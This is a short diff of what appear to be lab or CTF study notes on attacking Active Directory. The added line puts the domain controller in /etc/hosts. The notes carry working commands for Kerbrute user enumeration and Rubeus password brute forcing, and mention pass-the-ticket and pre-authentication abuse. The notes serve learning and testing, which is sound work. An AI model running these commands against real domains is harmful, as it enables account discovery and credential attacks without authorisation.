@@ -31,7 +31,7 @@ This exploits users that have Kerberos pre-authentication disabled. Using 'Rubeu
 
 
 Enumerate AD: 
-1. Kerbrute: DNS may be required. `./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt`. This will list users and services
+1. Kerbrute: DNS may be required. `./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt`. This will list users and services. You must add the domain controller IP to your /etc/hosts. `echo <ip> <domainname> >> /etc/hosts`
 2. Rubeus.exe: Collect tickets that can be used with pass the ticket attack.
    You can also brute force with a given password, no ticket. If the provided password matches, it will tell you the user but a lockout policy could prevent the attack. `Rubeus.exe brute /password:Password1 /noticket`
 
